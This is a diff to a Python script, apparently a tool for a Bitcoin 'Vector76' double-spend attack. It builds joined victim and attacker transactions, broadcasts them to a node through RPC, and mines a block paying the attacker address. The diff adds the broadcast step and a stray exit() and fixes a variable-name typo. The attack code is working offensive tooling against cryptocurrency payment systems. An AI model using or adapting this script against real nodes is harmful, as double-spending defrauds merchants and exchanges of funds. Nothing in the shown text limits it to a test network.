@@ -1,4 +1,5 @@
 import argparse
+import binascii
 import requests
 import subprocess
 import bitcoin.rpc
@@ -95,13 +96,16 @@ print()
 tx_vector76 = f"{tx_victim}{tx_attacker}"
 tx_vector76 = rpc_node.fundrawtransaction(tx_vector76)["hex"]
 tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
-
+print("Sending Vector76 block your node...")
+result = rpc_node.sendrawtransaction(tx_vector76)
 print(tx_vector76)
-print("Mining Vector76 Block...")
+print(f"result : {binascii.hexlify(result)}")
+print("Mining Vector76 block...")
 payload = [attacker_address, [tx_vector76], False]
 print(f"Payload : {payload}")
-vector76_respone = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
-print(f"Mining Response : {vector76_respone}")
+vector76_response = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
+exit()
+print(f"Mining Response : {vector76_response}")
 print()
 print("--------------------")
 print(f"Victim      : {victim_address}")
@@ -111,7 +115,7 @@ print(f"Fee Amount  (Satoshi unit)    : {fee} Satoshi")
 print(f"Signed V1 RawTx           : {tx_victim}")
 print(f"Signed V2 RawTx           : {tx_attacker}")
 print(f"Vector76  Block           : {tx_vector76}")
-print(f"Mined Vector76 Block      : {vector76_respone}")
+print(f"Mined Vector76 Block      : {vector76_response}")
 print("--------------------")
 print()
 print()
